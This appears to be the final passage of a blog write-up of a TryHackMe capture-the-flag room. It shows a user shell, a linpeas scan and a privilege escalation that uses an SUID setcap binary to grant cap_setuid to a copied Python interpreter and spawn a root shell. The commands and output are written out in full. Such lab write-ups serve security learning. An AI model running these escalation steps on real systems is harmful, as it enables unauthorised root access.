</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>annie<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>annie<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>annie<span style=color:#f92672>)</span>,24<span style=color:#f92672>(</span>cdrom<span style=color:#f92672>)</span>,27<span style=color:#f92672>(</span>sudo<span style=color:#f92672>)</span>,30<span style=color:#f92672>(</span>dip<span style=color:#f92672>)</span>,46<span style=color:#f92672>(</span>plugdev<span style=color:#f92672>)</span>,111<span style=color:#f92672>(</span>lpadmin<span style=color:#f92672>)</span>,112<span style=color:#f92672>(</span>sambashare<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>annie@desktop:/home/annie$ cat user.txt
</span></span><span style=display:flex><span>THM<span style=color:#f92672>{[</span>REDACTED<span style=color:#f92672>]}</span>
</span></span></code></pre></div><p>Now we are the user <code>annie</code> and can read the user.txt flag.</p><h2 id=privilege-escalation>Privilege Escalation<a hidden class=anchor aria-hidden=true href=#privilege-escalation>#</a></h2><p>Download <code>linpeas.sh</code> from PEASS-ng github page (<a href=https://github.com/carlospolop/PEASS-ng/releases/tag/20220821>https://github.com/carlospolop/PEASS-ng/releases/tag/20220821</a>) and transfer it to the victim machine.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>annie@desktop:/home/annie$ chmod +x linpeas.sh
</span></span><span style=display:flex><span>annie@desktop:/home/annie$ ./linpeas.sh
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ Interesting Files ‚ï†‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
</span></span><span style=display:flex><span>‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ SUID - Check easy privesc, exploits and write perms
</span></span><span style=display:flex><span>‚ïö https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root 10K Nov <span style=color:#ae81ff>16</span>  <span style=color:#ae81ff>2017</span> /sbin/setcap <span style=color:#f92672>(</span>Unknown SUID binary<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span></code></pre></div><p>There is an interesting SUID <code>/sbin/setcap</code>. It is used to assign or remove capabilities. We can use it to assign capabilities to <code>/home/annie/python3.6</code> which will be a copy of /usr/bin/python3.6.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>annie@desktop:/home/annie$ cp /usr/bin/python3.6 .
</span></span><span style=display:flex><span>annie@desktop:/home/annie$ setcap cap_setuid+ep /home/annie/python3.6
</span></span><span style=display:flex><span>annie@desktop:/home/annie$ getcap -r / 2&gt;/dev/null
</span></span><span style=display:flex><span>/home/annie/python3.6 <span style=color:#f92672>=</span> cap_setuid+ep
</span></span><span style=display:flex><span>/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper <span style=color:#f92672>=</span> cap_net_bind_service,cap_net_admin+ep
</span></span><span style=display:flex><span>/usr/bin/mtr-packet <span style=color:#f92672>=</span> cap_net_raw+ep
</span></span><span style=display:flex><span>/usr/bin/gnome-keyring-daemon <span style=color:#f92672>=</span> cap_ipc_lock+ep
</span></span><span style=display:flex><span>annie@desktop:/home/annie$ ./python3.6 -c <span style=color:#e6db74>&#39;import os; os.setuid(0); os.system(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span style=display:flex><span>root@desktop:/home/annie# id
</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>annie<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>annie<span style=color:#f92672>)</span>,24<span style=color:#f92672>(</span>cdrom<span style=color:#f92672>)</span>,27<span style=color:#f92672>(</span>sudo<span style=color:#f92672>)</span>,30<span style=color:#f92672>(</span>dip<span style=color:#f92672>)</span>,46<span style=color:#f92672>(</span>plugdev<span style=color:#f92672>)</span>,111<span style=color:#f92672>(</span>lpadmin<span style=color:#f92672>)</span>,112<span style=color:#f92672>(</span>sambashare<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>root@desktop:/root# cat root.txt
</span></span><span style=display:flex><span>THM<span style=color:#f92672>{[</span>REDACTED<span style=color:#f92672>]}</span>
</span></span></code></pre></div><p>This process can be found in this great article: <a href=https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/>https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/</a></p><p>Proof of Concept (PoC image):
<img src=../../../thm/annie/annie.png alt="Annie photo" style=width:700px;height:300px></p><ul class=post-tags><li><a href=https://geobour98.com/tags/anydesk/><strong>anydesk</strong></a></li><li><a href=https://geobour98.com/tags/udp/><strong>udp</strong></a><li><li><a href=https://geobour98.com/tags/msfvenom/><strong>msfvenom</strong></a><li><li><a href=https://geobour98.com/tags/python/><strong>python</strong></a></li><li><a href=https://geobour98.com/tags/linux/><strong>linux</strong></a></li><li><a href=https://geobour98.com/tags/linpeas/><strong>linpeas</strong></a></li><li><a href=https://geobour98.com/tags/suid/><strong>suid</strong></a></li><li><a href=https://geobour98.com/tags/setcap/><strong>setcap</strong></a></li></ul></div><footer class=post-footer></footer></article></main><footer class=footer><span>&copy; 2022 <a href=https://geobour98.com/>geobour98</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(t){t.preventDefault();var e=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView({behavior:"smooth"}),e==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${e}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(t=>{const n=t.parentNode.parentNode,e=document.createElement("button");e.classList.add("copy-code"),e.innerText="copy";function s(){e.innerText="copied!",setTimeout(()=>{e.innerText="copy"},2e3)}e.addEventListener("click",o=>{if("clipboard"in navigator){navigator.clipboard.writeText(t.textContent),s();return}const e=document.createRange();e.selectNodeContents(t);const n=window.getSelection();n.removeAllRanges(),n.addRange(e);try{document.execCommand("copy"),s()}catch(e){}n.removeRange(e)}),n.classList.contains("highlight")?n.appendChild(e):n.parentNode.firstChild==n||(t.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?t.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(e):t.parentNode.appendChild(e))})</script></body></html>